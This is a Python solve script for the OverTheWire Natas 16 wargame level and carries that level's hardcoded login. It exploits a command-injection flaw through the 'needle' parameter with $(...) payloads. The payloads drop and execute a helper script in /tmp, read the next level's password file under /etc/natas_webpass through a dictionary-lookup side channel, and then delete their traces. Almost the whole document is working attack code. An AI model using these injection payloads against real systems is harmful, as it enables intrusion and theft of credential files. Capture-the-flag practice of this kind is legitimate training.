import requests
from requests.auth import HTTPBasicAuth  
from urllib.parse import quote
import base64
import re

base_url = 'http://natas16.natas.labs.overthewire.org'
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  

#setup
shifter_script = "shift $1\necho $1\n\n"

shifter_b64 = base64.b64encode(bytes(shifter_script,"ascii")).decode('ascii')

setup_payload = [
  f'$(echo -n {shifter_b64} > /tmp/shifter.b64)',
  '$(base64 -d < /tmp/shifter.b64 > /tmp/shifter.sh)',
  '$(chmod a+x /tmp/shifter.sh 1)'
]

for payload in setup_payload:
  r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)

#extract natas17 password
matches = []
for pair in range(1,17): 
  payload=f'^$(sed -n $(/tmp/shifter.sh {pair} $(od -An -tu2 -w64 < /etc/natas_webpass/natas17))p < dictionary.txt)$'
  r = requests.post(base_url, data={"needle": payload}, auth=auth)
  reply_text = r.text.replace('\n', ' ').replace('\r', '')
  m = re.search('<pre>(.+)</pre>', reply_text)
  word = m.group(1).strip()
  matches.append(word)

#grab dictionary.txt
r = requests.get(f'{base_url}/dictionary.txt', auth=auth)
diclines = r.text.splitlines() 
print(matches)

elb = []
for m in matches:
  i = diclines.index(m)+1
  elb.append(i & 255)
  elb.append(i >> 8)

#password
print("".join([chr(c) for c in elb]))

#cleanup
payload = '$(rm /tmp/shifter.*)'
r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
